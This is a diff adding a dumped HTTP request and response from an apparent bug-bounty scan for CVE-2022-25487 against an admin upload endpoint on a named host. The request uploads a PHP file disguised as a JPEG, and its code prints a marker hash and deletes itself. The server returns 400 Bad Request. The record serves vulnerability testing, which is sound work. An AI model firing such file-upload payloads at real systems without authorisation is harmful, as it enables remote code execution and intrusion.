@@ -1,0 +1,36 @@
+[CVE-2022-25487] Dumped HTTP request for https://techsolutions.bitpanda.com/admin/uploads.php?id=1
+
+
+POST /admin/uploads.php?id=1 HTTP/1.1
+Host: techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0
+Connection: close
+Content-Length: 404
+Content-Type: multipart/form-data; boundary=---------------------------30623082103363803402542706041
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+-----------------------------30623082103363803402542706041
+Content-Disposition: form-data; name="file"
+
+
+-----------------------------30623082103363803402542706041
+Content-Disposition: form-data; name="file"; filename="30rudjfFkk4mxBgkKxooY6FkYfs.php"
+Content-Type: image/jpeg
+
+
+<?php echo md5("CVE-2022-25487");unlink(__FILE__);?>
+-----------------------------30623082103363803402542706041--
+
+[CVE-2022-25487] Dumped HTTP response https://techsolutions.bitpanda.com/admin/uploads.php?id=1
+
+HTTP/1.1 400 Bad Request
+Connection: close
+Content-Length: 11
+Date: Tue, 05 Aug 2025 12:53:23 GMT
+Via: 1.1 f28664317eb9628b30397afa3d6b821c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: Ct6LxaKylQddH_j-5JFyMTYx7wCjb64jZX3HJpkvPM7SM05sy4Y0Vg==
+X-Amz-Cf-Pop: IAD55-P8
+X-Cache: LambdaGeneratedResponse from cloudfront
+
+Bad Request
